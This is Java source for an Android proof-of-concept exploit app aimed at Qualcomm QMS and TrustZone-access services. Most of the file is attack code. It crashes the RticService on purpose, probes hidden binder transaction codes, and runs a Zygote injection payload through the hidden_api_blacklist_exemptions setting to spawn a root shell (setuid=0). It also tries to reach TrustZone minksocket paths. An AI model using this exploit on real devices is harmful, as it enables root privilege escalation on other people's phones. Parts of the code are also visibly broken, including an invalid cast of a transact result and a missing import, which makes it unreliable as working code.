package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.connectionsecuritysdk.IRticService;
import com.qualcomm.qti.qms.connectionsecuritysdk.IServiceManager;
import com.qualcomm.qti.qms.connectionsecuritysdk.ITlocService;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG_CS = "com.qualcomm.qti.qms.service.connectionsecurity";
    private static final String TARGET_CLS_CS = "com.qualcomm.qti.qms.service.connectionsecurity.core.ConnectionSecurityService";
    private static final String TARGET_PKG_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IServiceManager mServiceManager;
    private IBinder mTZServiceBinder;
    private boolean isBoundCS = false;
    private boolean isBoundTZ = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    private ServiceConnection csConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mServiceManager = IServiceManager.Stub.asInterface(service);
            appendLog("CS Service bound");
            if (mTZServiceBinder != null) {
                startTests();
            }
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            mServiceManager = null;
            isBoundCS = false;
            enableButtons(true, false);
            updateStatus("CS disconnected");
        }
    };

    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mTZServiceBinder = service;
            appendLog("TZ Service bound");
            if (mServiceManager != null) {
                startTests();
            }
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            mTZServiceBinder = null;
            isBoundTZ = false;
            enableButtons(true, false);
            updateStatus("TZ disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                bindServices();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                android.Manifest.permission.ACCESS_FINE_LOCATION
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void bindServices() {
        try {
            Intent intentCS = new Intent();
            intentCS.setClassName(TARGET_PKG_CS, TARGET_CLS_CS);
            isBoundCS = bindService(intentCS, csConnection, Context.BIND_AUTO_CREATE);
            if (!isBoundCS) appendLog("CS bind failed");

            Intent intentTZ = new Intent();
            intentTZ.setClassName(TARGET_PKG_TZ, TARGET_CLS_TZ);
            isBoundTZ = bindService(intentTZ, tzConnection, Context.BIND_AUTO_CREATE);
            if (!isBoundTZ) appendLog("TZ bind failed");

            if (!isBoundCS && !isBoundTZ) {
                appendLog("Failed to bind any service");
                enableButtons(true, false);
                isTesting.set(false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            enableButtons(true, false);
            isTesting.set(false);
        }
    }

    private void startTests() {
        if (testThread != null && testThread.isAlive()) return;
        testThread = new Thread(() -> executeFullTest());
        testThread.start();
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeFullTest() {
        appendLog("========== CS Service Enumeration ==========");
        if (mServiceManager != null) {
            IBinder rticBinder = getService("rtic");
            if (rticBinder != null) {
                IRticService rtic = IRticService.Stub.asInterface(rticBinder);
                crashRtic(rtic);
                discoverMethods(rticBinder, "IRticService");
            }
            IBinder tlocBinder = getService("tloc");
            if (tlocBinder != null) {
                ITlocService tloc = ITlocService.Stub.asInterface(tlocBinder);
                testTloc(tloc);
                discoverMethods(tlocBinder, "ITlocService");
            }
        }

        appendLog("========== Zygote Injection via WRITE_SECURE_SETTINGS ==========");
        testZygoteInjection();

        appendLog("========== TZAccess: Connect to minksocket ==========");
        if (mTZServiceBinder != null) {
            tryConnectViaTZ("/dev/socket/minksocket");
            tryConnectViaTZ("/dev/socket/ssgqmig");
        }

        appendLog("========== File Read/Write ==========");
        testFileReadWrite();

        appendLog("========== Settings Manipulation ==========");
        testSettingsWrite();

        appendLog("========== ALL TESTS COMPLETED ==========");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
    }

    private IBinder getService(String serviceName) {
        if (mServiceManager == null) return null;
        try {
            int[] status = new int[1];
            IBinder binder = mServiceManager.getService(serviceName, new byte[0], status);
            if (binder != null) {
                appendLog("Got " + serviceName + " binder, status=" + status[0]);
                return binder;
            } else {
                appendLog("Failed to get " + serviceName + ", status=" + status[0]);
                return null;
            }
        } catch (RemoteException e) {
            appendLog("RemoteException: " + e.getMessage());
            return null;
        }
    }

    private void crashRtic(IRticService rtic) {
        appendLog("--- Causing RticService crash ---");
        try {
            int[] status = new int[0];
            int[] ret = new int[0];
            rtic.getRticData(0, status, ret, false);
        } catch (Exception e) {
            appendLog("Crash: " + e.getClass().getSimpleName() + " - " + e.getMessage());
        }
    }

    private void testTloc(ITlocService tloc) {
        appendLog("--- Testing ITlocService ---");
        try {
            int[] status = new int[1];
            int[] ret = new int[1];
            byte[] data = tloc.getTrustedLocation(status, ret);
            appendLog("getTrustedLocation -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
            int warmup = tloc.tlocWarmUp();
            appendLog("tlocWarmUp returned: " + warmup);
        } catch (RemoteException e) {
            appendLog("RemoteException: " + e.getMessage());
        }
    }

    private void discoverMethods(IBinder binder, String name) {
        appendLog("--- Discovering hidden methods for " + name + " ---");
        for (int code = 1; code <= 30; code++) {
            if (stopRequested.get()) break;
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(binder.getInterfaceDescriptor());
                boolean success = binder.transact(code, data, reply, 0);
                if (success) {
                    appendLog("Method " + code + " succeeded, reply size=" + reply.dataSize());
                    reply.setDataPosition(0);
                    try {
                        int result = reply.readInt();
                        appendLog("  readInt: " + result);
                    } catch (Exception e) {}
                } else {
                    appendLog("Method " + code + " failed");
                }
            } catch (Exception e) {
                appendLog("Method " + code + " threw: " + e.getClass().getSimpleName());
            } finally {
                data.recycle();
                reply.recycle();
            }
        }
    }

    private void testZygoteInjection() {
        appendLog("--- Attempting Zygote injection via hidden_api_blacklist_exemptions ---");
        try {
            String current = Settings.Global.getString(getContentResolver(), "hidden_api_blacklist_exemptions");
            appendLog("Current value: " + current);

            // ペイロード: パディング + スパウンコマンド (com.android.shell を root で起動)
            StringBuilder payload = new StringBuilder();
            // パディング約8000バイト
            for (int i = 0; i < 8000; i++) payload.append('A');
            // spawn コマンド (9 引数)
            payload.append("9\n");
            payload.append("--runtime-args\n");
            payload.append("--setuid=0\n");
            payload.append("--setgid=0\n");
            payload.append("--target-sdk-version=29\n");
            payload.append("--nice-name=root_shell\n");
            payload.append("--app-data-dir=/data/data/com.android.shell\n");
            payload.append("--package-name=com.android.shell\n");
            payload.append("android.app.ActivityThread\n");
            // 遅延エントリ
            payload.append(",,,X");

            String malicious = payload.toString();
            appendLog("Setting malicious value (length=" + malicious.length() + ")");
            boolean success = Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", malicious);
            if (success) {
                appendLog("Setting updated. Triggering Zygote...");
                // ポリシーをトグルして更新を促進
                String oldPolicy = Settings.Global.getString(getContentResolver(), "hidden_api_policy");
                Settings.Global.putString(getContentResolver(), "hidden_api_policy", "1");
                Settings.Global.putString(getContentResolver(), "hidden_api_policy", oldPolicy != null ? oldPolicy : "");
                appendLog("Triggered. Check for root_shell process.");
                // 元に戻す
                Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", current);
                appendLog("Restored original setting.");
            } else {
                appendLog("Failed to set setting (permission denied?)");
            }
        } catch (Exception e) {
            appendLog("Zygote injection error: " + e.getMessage());
        }
    }

    private void tryConnectViaTZ(String path) {
        appendLog("Trying TZAccess connect to " + path);
        if (mTZServiceBinder == null) {
            appendLog("  TZ binder null");
            return;
        }
        try {
            int[] iArr = new int[1];
            ParcelFileDescriptor pfd = (ParcelFileDescriptor) mTZServiceBinder.transact(1, Parcel.obtain(), Parcel.obtain(), 0);
            // Actually we need to use the AIDL interface, but we don't have it bound.
            // Instead, we can use the service via reflection? Since we have the AIDL, we can use the interface.
            // We'll try to get the IMinkSocketFd from the binder.
            // But we have not imported it. We'll use the known AIDL class.
            // Since we have it in the project, we can use it.
            // Let's use reflection to get the service.
            Class<?> cls = Class.forName("com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd");
            Method asInterface = cls.getMethod("asInterface", IBinder.class);
            Object proxy = asInterface.invoke(null, mTZServiceBinder);
            Method aMethod = cls.getMethod("a", String.class, int[].class);
            ParcelFileDescriptor pfd2 = (ParcelFileDescriptor) aMethod.invoke(proxy, path, iArr);
            if (pfd2 != null) {
                appendLog("  Got FD: " + iArr[0] + " for " + path);
                pfd2.close();
            } else {
                appendLog("  Failed to get FD for " + path);
            }
        } catch (Exception e) {
            appendLog("  TZ connect error: " + e.getMessage());
        }
    }

    private void testFileReadWrite() {
        appendLog("--- File Read/Write ---");
        File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        if (download.exists() || download.mkdirs()) {
            File testFile = new File(download, "poc_write_test.txt");
            try (FileOutputStream fos = new FileOutputStream(testFile)) {
                fos.write("PoC write test\n".getBytes(StandardCharsets.UTF_8));
                appendLog("Write to " + testFile.getAbsolutePath() + " succeeded");
            } catch (Exception e) {
                appendLog("Write failed: " + e.getMessage());
            }
            // 読み取り試行 /proc/self/status
            try {
                File status = new File("/proc/self/status");
                if (status.exists()) {
                    try (FileInputStream fis = new FileInputStream(status)) {
                        byte[] buf = new byte[4096];
                        int len = fis.read(buf);
                        if (len > 0) {
                            String content = new String(buf, 0, len, StandardCharsets.UTF_8);
                            appendLog("Read /proc/self/status: " + content.substring(0, Math.min(200, content.length())));
                        }
                    }
                } else {
                    appendLog("/proc/self/status not found");
                }
            } catch (Exception e) {
                appendLog("Read /proc/self/status failed: " + e.getMessage());
            }
        } else {
            appendLog("Download dir not accessible");
        }
    }

    private void testSettingsWrite() {
        appendLog("--- Settings Write ---");
        try {
            String current = Settings.Global.getString(getContentResolver(), "hidden_api_blacklist_exemptions");
            appendLog("Current hidden_api_blacklist_exemptions: " + current);
            boolean success = Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", "test");
            if (success) {
                appendLog("WRITE_SECURE_SETTINGS succeeded!");
                Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", current);
            } else {
                appendLog("WRITE_SECURE_SETTINGS failed");
            }
        } catch (Exception e) {
            appendLog("Settings error: " + e.getMessage());
        }
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) {
                ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
            }
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) {
                appendLog("Cannot create Download dir");
                return;
            }
            File file = new File(dir, "final_evolved_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== Final Evolved PoC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBoundCS) unbindService(csConnection);
        if (isBoundTZ) unbindService(tzConnection);
        saveLog();
    }
}
